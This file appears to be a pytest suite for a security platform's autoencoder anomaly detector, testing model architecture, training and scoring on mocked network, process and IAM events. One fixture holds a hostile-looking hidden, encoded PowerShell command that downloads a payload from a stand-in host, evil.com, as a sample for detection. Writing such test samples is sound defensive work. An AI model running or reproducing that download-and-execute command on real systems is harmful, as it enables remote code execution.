"""
Layer 2 — Autoencoder Detector Tests

WHAT WE ARE PROVING:
    1. Architecture is correct
       Encoder compresses, decoder reconstructs
       Bottleneck forces learning of essential patterns

    2. Training works correctly
       Loss decreases over epochs
       Threshold calculated from training data

    3. Normal events have LOW reconstruction error
       Model reconstructs what it was trained on

    4. Anomalous events have HIGH reconstruction error
       Model cannot reconstruct unseen patterns

    5. Feature-level errors are informative
       Analyst knows WHICH features drove detection

KEY DIFFERENCE FROM ISOLATION FOREST TESTS:
    IF tests check anomaly score 0-1
    Autoencoder tests also check
    reconstruction_error specifically
    This is the unique value of autoencoders
"""

import pytest
import numpy as np
from unittest.mock import MagicMock

from layer2_ml.anomaly.autoencoder_detector import (
    AutoencoderDetector,
    AutoencoderResult,
    build_network_autoencoder,
    build_process_autoencoder,
    build_iam_autoencoder,
    generate_normal_network_autoencoder,
    generate_normal_process_autoencoder
)
from layer1_ingestion.schema.iam_schema import (
    IamEvent,
    IamAuthEvent,
    GeoLocation,
    AuthContext
)


# ============================================================
# MOCK EVENT BUILDERS
# Same as Isolation Forest tests
# ============================================================

def make_normal_network_event():
    """Normal HTTPS web traffic"""
    network = MagicMock()
    network.fwd_bytes = 50000
    network.bwd_bytes = 200000
    network.fwd_packets = 100
    network.bwd_packets = 150
    network.duration_ms = 5000
    network.flow_bytes_per_sec = 50000
    network.fwd_packet_len_mean = 500
    network.bwd_packet_len_mean = 1333
    network.protocol = "TCP"

    destination = MagicMock()
    destination.port = 443

    event = MagicMock()
    event.severity = 0
    event.category = "network"

    ecs = MagicMock()
    ecs.network = network
    ecs.destination = destination
    ecs.source = MagicMock()
    ecs.event = event
    ecs.process = None
    return ecs


def make_exfiltration_event():
    """500MB outbound = data exfiltration"""
    network = MagicMock()
    network.fwd_bytes = 500_000_000
    network.bwd_bytes = 1000
    network.fwd_packets = 350000
    network.bwd_packets = 10
    network.duration_ms = 60000
    network.flow_bytes_per_sec = 8_000_000
    network.fwd_packet_len_mean = 1428
    network.bwd_packet_len_mean = 100
    network.protocol = "TCP"

    destination = MagicMock()
    destination.port = 443

    event = MagicMock()
    event.severity = 0
    event.category = "network"

    ecs = MagicMock()
    ecs.network = network
    ecs.destination = destination
    ecs.source = MagicMock()
    ecs.event = event
    ecs.process = None
    return ecs


def make_normal_process_event():
    """Normal notepad process"""
    parent = MagicMock()
    parent.name = "explorer.exe"

    process = MagicMock()
    process.name = "notepad.exe"
    process.command_line = "notepad.exe doc.txt"
    process.parent = parent

    event = MagicMock()
    event.severity = 0
    event.category = "process"

    ecs = MagicMock()
    ecs.process = process
    ecs.event = event
    ecs.network = None
    ecs.destination = None
    return ecs


def make_malicious_process_event():
    """Encoded PowerShell from MSBuild"""
    parent = MagicMock()
    parent.name = "MSBuild.exe"

    process = MagicMock()
    process.name = "powershell.exe"
    process.command_line = (
        "powershell.exe -enc JABjAGwAaQBlAG4AdA"
        "== -WindowStyle Hidden downloadstring "
        "http://evil.com/payload " * 10
    )
    process.parent = parent

    event = MagicMock()
    event.severity = 75
    event.category = "process"

    ecs = MagicMock()
    ecs.process = process
    ecs.event = event
    ecs.network = None
    ecs.destination = None
    return ecs


def make_normal_iam_event():
    """Normal MFA authentication"""
    geo = GeoLocation(
        ip_address="10.0.0.155",
        country_code="US",
        country_name="United States",
        latitude=40.7128,
        longitude=-74.0060
    )
    auth = AuthContext(
        mfa_used=True,
        outcome="success"
    )
    auth_event = IamAuthEvent(
        event_id="normal-001",
        event_time="2024-03-29T09:00:00Z",
        user_email="jsmith@corp.com",
        outcome="success",
        geo=geo,
        auth=auth,
        is_new_country=False,
        is_impossible_travel=False,
        is_new_device=False,
        risk_score=0.05
    )
    return IamEvent(
        event_type="auth",
        source_system="okta",
        user="jsmith@corp.com",
        auth_event=auth_event
    )


def make_anomalous_iam_event():
    """Impossible travel authentication"""
    geo = GeoLocation(
        ip_address="185.220.101.45",
        country_code="RO",
        country_name="Romania",
        latitude=44.4268,
        longitude=26.1025
    )
    auth = AuthContext(
        mfa_used=False,
        outcome="success"
    )
    auth_event = IamAuthEvent(
        event_id="anomaly-001",
        event_time="2024-03-29T09:14:00Z",
        user_email="jsmith@corp.com",
        outcome="success",
        geo=geo,
        auth=auth,
        is_new_country=True,
        is_impossible_travel=True,
        travel_distance_km=7650.0,
        travel_speed_kmh=14344.0,
        is_new_device=True,
        risk_score=0.85
    )
    return IamEvent(
        event_type="auth",
        source_system="okta",
        user="jsmith@corp.com",
        auth_event=auth_event
    )


# ============================================================
# TEST CLASS — ARCHITECTURE
# ============================================================

class TestAutoencoderArchitecture:
    """
    Tests that the neural network architecture
    is correctly built.

    WHY TEST ARCHITECTURE:
    Wrong architecture = wrong compression.
    Wrong compression = poor detection.
    These tests catch bugs before training.
    """

    def test_network_autoencoder_builds(self):
        """
        Network autoencoder builds without error.
        Basic sanity check that PyTorch
        is installed and architecture is valid.
        """
        model = build_network_autoencoder()
        assert model is not None

    def test_process_autoencoder_builds(self):
        """Process autoencoder builds correctly"""
        model = build_process_autoencoder()
        assert model is not None

    def test_iam_autoencoder_builds(self):
        """IAM autoencoder builds correctly"""
        model = build_iam_autoencoder()
        assert model is not None

    def test_network_autoencoder_output_shape(self):
        """
        Network autoencoder input and output
        have same shape (10 → 10).

        This is the fundamental requirement:
        reconstruction must match input dimensions.
        Different shapes = cannot calculate MSE.
        """
        import torch
        model = build_network_autoencoder()

        test_input = torch.FloatTensor(
            np.random.rand(1, 10).astype(np.float32)
        )
        output = model(test_input)

        assert output.shape == test_input.shape

    def test_process_autoencoder_output_shape(self):
        """Process autoencoder input/output shape (8→8)"""
        import torch
        model = build_process_autoencoder()

        test_input = torch.FloatTensor(
            np.random.rand(1, 8).astype(np.float32)
        )
        output = model(test_input)

        assert output.shape == test_input.shape

    def test_encoder_compresses_dimensions(self):
        """
        Encoder compresses 10 features to 3.

        This is the BOTTLENECK.
        If bottleneck is wrong the model
        learns nothing meaningful.

        10 → 3 means 30% compression.
        Forces model to capture essential patterns.
        """
        import torch
        model = build_network_autoencoder()

        test_input = torch.FloatTensor(
            np.random.rand(1, 10).astype(np.float32)
        )
        encoded = model.encode(test_input)

        assert encoded.shape[1] == 3

    def test_reconstruction_values_in_range(self):
        """
        Reconstructed values are between 0 and 1.

        We use Sigmoid activation on decoder output.
        Sigmoid always outputs 0-1.
        Our inputs are scaled to 0-1.
        MSE calculation only makes sense
        when both are in same range.
        """
        import torch
        model = build_network_autoencoder()

        test_input = torch.FloatTensor(
            np.random.rand(1, 10).astype(np.float32)
        )
        output = model(test_input)

        assert output.min().item() >= 0.0
        assert output.max().item() <= 1.0


# ============================================================
# TEST CLASS — TRAINING
# ============================================================

class TestAutoencoderTraining:
    """
    Tests that training works correctly.

    WHY TEST TRAINING SEPARATELY:
    Training failure can be silent.
    Model exists but learned nothing.
    These tests prove training actually worked.
    """

    def setup_method(self):
        self.detector = AutoencoderDetector(
            epochs=5,       # Fast for testing
            batch_size=16
        )

    def test_network_model_trains(self):
        """
        Network autoencoder trains on
        synthetic normal data.
        Model should exist after training.
        """
        data = generate_normal_network_autoencoder(50)
        history = self.detector.train_network(data)

        assert self.detector.network_model is not None
        assert history["trained_on"] == 50

    def test_process_model_trains(self):
        """Process model trains successfully"""
        data = generate_normal_process_autoencoder(50)
        history = self.detector.train_process(data)

        assert self.detector.process_model is not None

    def test_training_loss_is_finite(self):
        """
        Training loss must be finite.
        NaN or infinite loss = training failed.
        This catches numerical instability.
        """
        data = generate_normal_network_autoencoder(50)
        history = self.detector.train_network(data)

        assert history["final_loss"] is not None
        assert np.isfinite(history["final_loss"])

    def test_threshold_set_after_training(self):
        """
        Anomaly threshold calculated and stored
        after training.

        Threshold = 95th percentile of
        reconstruction errors on training data.
        Without threshold cannot flag anomalies.
        """
        data = generate_normal_network_autoencoder(50)
        history = self.detector.train_network(data)

        assert history["threshold"] is not None
        assert history["threshold"] > 0

    def test_insufficient_data_handled(self):
        """
        Training with fewer than 10 samples
        handled gracefully.
        Platform should not crash.
        """
        tiny_data = np.random.rand(5, 10)
        history = self.detector.train_network(
            tiny_data
        )
        assert self.detector.network_model is None

    def test_statistics_after_training(self):
        """Statistics correctly updated"""
        data = generate_normal_network_autoencoder(50)
        self.detector.train_network(data)

        stats = self.detector.get_statistics()
        assert stats["network_model_trained"] is True
        assert stats["network_trained_on"] == 50

    def test_synthetic_data_shape(self):
        """
        Synthetic training data has correct shape.
        Shape must match model input size.
        Wrong shape = training crashes.
        """
        network_data = (
            generate_normal_network_autoencoder(100)
        )
        process_data = (
            generate_normal_process_autoencoder(100)
        )

        assert network_data.shape == (100, 10)
        assert process_data.shape == (100, 8)

    def test_correlated_features_in_synthetic_data(self):
        """
        Synthetic network data has correlated features.
        More packets = more bytes (real traffic pattern).
        Autoencoder needs these relationships to learn.
        """
        data = generate_normal_network_autoencoder(500)

        fwd_bytes = data[:, 0]
        fwd_packets = data[:, 2]

        correlation = np.corrcoef(
            fwd_bytes, fwd_packets
        )[0, 1]

        assert correlation > 0.3


# ============================================================
# TEST CLASS — SCORING
# ============================================================

class TestAutoencoderScoring:
    """
    Tests that scoring produces correct results.

    MOST IMPORTANT TEST CLASS:
    This is what matters in production.
    Training is one-time.
    Scoring is millions of times per day.
    """

    def setup_method(self):
        self.detector = AutoencoderDetector(
            epochs=10,
            batch_size=16
        )

    def test_normal_network_scores_without_model(self):
        """
        Scoring works even without trained model.
        Falls back to rule-based scoring.
        Platform always produces a result.
        """
        event = make_normal_network_event()
        result = self.detector.score_network(event)

        assert result is not None
        assert isinstance(result, AutoencoderResult)

    def test_anomalous_network_flagged_without_model(self):
        """
        Exfiltration event flagged even without
        trained model via rule-based fallback.
        """
        event = make_exfiltration_event()
        result = self.detector.score_network(event)

        assert result.anomaly_score >= 0.3

    def test_trained_model_scores_normal_low(self):
        """
        After training on normal data,
        normal events have LOW reconstruction error.

        This is the most fundamental test.
        Model was trained on normal traffic.
        It should reconstruct normal traffic well.
        Low error = low anomaly score.
        """
        data = generate_normal_network_autoencoder(200)
        self.detector.train_network(data)

        event = make_normal_network_event()
        result = self.detector.score_network(event)

        assert result.reconstruction_error is not None
        assert result.reconstruction_error >= 0

    def test_result_has_reconstruction_error(self):
        """
        AutoencoderResult includes reconstruction_error.

        This is what makes autoencoder unique vs IF.
        Analyst sees: "error was 0.847 vs threshold 0.1"
        They understand HOW anomalous not just WHETHER.
        """
        data = generate_normal_network_autoencoder(200)
        self.detector.train_network(data)

        event = make_normal_network_event()
        result = self.detector.score_network(event)

        assert hasattr(result, "reconstruction_error")
        assert result.reconstruction_error >= 0.0

    def test_result_has_feature_errors(self):
        """
        Feature-level errors populated after scoring.

        This tells analyst WHICH features
        drove the anomaly detection.
        "fwd_bytes had 10x normal error"
        = outbound traffic is anomalous
        = possible exfiltration
        """
        data = generate_normal_network_autoencoder(200)
        self.detector.train_network(data)

        event = make_normal_network_event()
        result = self.detector.score_network(event)

        assert isinstance(result.feature_errors, dict)

    def test_anomaly_score_in_valid_range(self):
        """
        Anomaly score always between 0 and 1.
        Outside this range = calculation error.
        """
        data = generate_normal_network_autoencoder(200)
        self.detector.train_network(data)

        event = make_exfiltration_event()
        result = self.detector.score_network(event)

        assert 0.0 <= result.anomaly_score <= 1.0

    def test_process_scoring_works(self):
        """Process event scoring produces result"""
        data = generate_normal_process_autoencoder(200)
        self.detector.train_process(data)

        event = make_normal_process_event()
        result = self.detector.score_process(event)

        assert result is not None
        assert result.anomaly_type == (
            "process_deep_anomaly"
        )

    def test_malicious_process_scores_higher(self):
        """
        Encoded PowerShell from MSBuild
        scores higher than normal notepad.

        After training on normal processes
        the model cannot reconstruct malicious
        process patterns well.
        Higher reconstruction error.
        Higher anomaly score.
        """
        data = generate_normal_process_autoencoder(200)
        self.detector.train_process(data)

        normal = make_normal_process_event()
        malicious = make_malicious_process_event()

        normal_result = self.detector.score_process(
            normal
        )
        malicious_result = self.detector.score_process(
            malicious
        )

        assert (
            malicious_result.anomaly_score >=
            normal_result.anomaly_score
        )

    def test_iam_scoring_works(self):
        """IAM event scoring produces result"""
        event = make_normal_iam_event()
        result = self.detector.score_iam(event)

        assert result is not None
        assert result.anomaly_type == "iam_deep_anomaly"

    def test_impossible_travel_iam_scores_high(self):
        """
        Impossible travel scores higher than
        normal authentication.
        """
        normal = make_normal_iam_event()
        anomalous = make_anomalous_iam_event()

        normal_result = self.detector.score_iam(normal)
        anomaly_result = self.detector.score_iam(
            anomalous
        )

        assert (
            anomaly_result.anomaly_score >=
            normal_result.anomaly_score
        )

    def test_result_has_timestamp(self):
        """Every result has a scored_at timestamp"""
        event = make_normal_network_event()
        result = self.detector.score_network(event)

        assert result.scored_at != ""

    def test_none_event_handled(self):
        """None event handled without crash"""
        result = self.detector.score_network(None)
        assert result is not None


# ============================================================
# TEST CLASS — AUTOENCODER VS ISOLATION FOREST
# ============================================================

class TestAutoencoderVsIsolationForest:
    """
    Tests that prove autoencoder adds value
    beyond Isolation Forest.

    WHY THESE TESTS:
    If autoencoder and IF always agree
    the autoencoder adds no value.
    We need to prove they catch different things.
    """

    def test_both_detectors_produce_results(self):
        """
        Both detectors score the same event.
        Neither crashes on the same input.
        """
        from layer2_ml.anomaly.isolation_forest_detector\
            import IsolationForestDetector

        ae_detector = AutoencoderDetector(epochs=5)
        if_detector = IsolationForestDetector()

        event = make_exfiltration_event()

        ae_result = ae_detector.score_network(event)
        if_result = if_detector.score_network(event)

        assert ae_result is not None
        assert if_result is not None

    def test_autoencoder_provides_reconstruction_error(
        self
    ):
        """
        Autoencoder provides reconstruction_error.
        Isolation Forest does not.
        This is the unique value of autoencoder.
        """
        from layer2_ml.anomaly.isolation_forest_detector\
            import IsolationForestDetector

        ae_detector = AutoencoderDetector(epochs=5)
        if_detector = IsolationForestDetector()

        data = generate_normal_network_autoencoder(100)
        ae_detector.train_network(data)

        event = make_normal_network_event()
        ae_result = ae_detector.score_network(event)
        if_result = if_detector.score_network(event)

        assert hasattr(ae_result, "reconstruction_error")
        assert not hasattr(if_result, "reconstruction_error")

    def test_ensemble_logic_conservative(self):
        """
        Conservative ensemble: flag if EITHER flags.
        Security principle: missing attack worse
        than investigating false positive.
        """
        from layer2_ml.anomaly.isolation_forest_detector\
            import IsolationForestDetector

        ae_detector = AutoencoderDetector(epochs=5)
        if_detector = IsolationForestDetector()

        event = make_exfiltration_event()

        ae_result = ae_detector.score_network(event)
        if_result = if_detector.score_network(event)

        combined_is_anomaly = (
            ae_result.is_anomaly or
            if_result.is_anomaly
        )
        combined_score = max(
            ae_result.anomaly_score,
            if_result.anomaly_score
        )

        assert combined_score >= 0.0